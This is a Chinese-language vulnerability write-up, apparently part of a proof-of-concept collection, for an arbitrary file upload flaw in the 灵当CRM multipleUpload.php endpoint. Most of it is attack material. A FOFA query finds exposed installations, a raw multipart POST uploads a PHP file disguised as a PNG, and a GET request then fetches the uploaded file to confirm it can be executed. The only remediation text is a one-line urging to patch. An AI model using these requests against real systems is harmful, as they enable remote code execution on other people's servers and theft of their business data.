**漏洞名称**

灵当CRM系统multipleUpload.php任意文件上传漏洞

**漏洞影响**

灵当CRM，版本信息不详

漏洞描述

灵当CRM是上海灵当信息科技有限公司开发的一款CRM软件，适用于以销售和服务业务为主的中小型企业。产品功能集销售管理、机会管理、渠道管理、售后服务管理、热线管理、合同管理、收付款管理、库存管理、人事管理、绩效与奖金管理、报表中心、呼叫中心管理于一体，帮助中小型企业实现销售、服务、财务一体化管理。灵当CRM系统接口multipleUpload.php文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全，请及时修复。

**FOFA搜索语句**

```
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

漏洞复现

1，上传文件



```yaml
POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Length: 207
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqpvtioxyquthilrc
Accept-Encoding: gzip

------WebKitFormBoundaryqpvtioxyquthilrc
Content-Disposition: form-data; name="file"; filename="kapke.php"
Content-Type: image/png

123456
------WebKitFormBoundaryqpvtioxyquthilrc--
```

2,查看回显文件

部分回显路径需要从第一步的响应数据包中获取，然后拼接前缀/crm/和文件名



```
GET /crm/storage/2024/September/week4/kapke.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```